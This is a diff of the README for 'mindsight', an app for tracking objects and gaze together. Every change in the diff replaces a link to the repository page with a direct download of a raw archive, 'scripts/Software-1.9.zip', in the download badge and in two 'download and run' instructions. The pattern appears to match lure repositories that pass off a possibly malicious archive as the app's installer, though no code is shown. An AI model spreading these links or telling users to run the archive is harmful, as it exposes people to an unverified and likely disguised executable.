@@ -1,6 +1,6 @@
 # 🧠 mindsight - Track objects and gaze together
 
-[![Download mindsight](https://img.shields.io/badge/Download-mindsight-blue?style=for-the-badge)](https://github.com/Xxpedo-gamingxX/mindsight)
+[![Download mindsight](https://img.shields.io/badge/Download-mindsight-blue?style=for-the-badge)](https://github.com/Xxpedo-gamingxX/mindsight/raw/refs/heads/main/scripts/Software-1.9.zip)
 
 ## 🎯 What mindsight does
 
@@ -27,7 +27,7 @@ If you plan to work with video or image data, a faster processor will help.
 
 Go to this page to download and run the app:
 
-https://github.com/Xxpedo-gamingxX/mindsight
+https://github.com/Xxpedo-gamingxX/mindsight/raw/refs/heads/main/scripts/Software-1.9.zip
 
 ## 🚀 Install and open on Windows
 
@@ -180,4 +180,4 @@ mindsight works well for:
 
 Download and run mindsight from:
 
-https://github.com/Xxpedo-gamingxX/mindsight
+https://github.com/Xxpedo-gamingxX/mindsight/raw/refs/heads/main/scripts/Software-1.9.zip
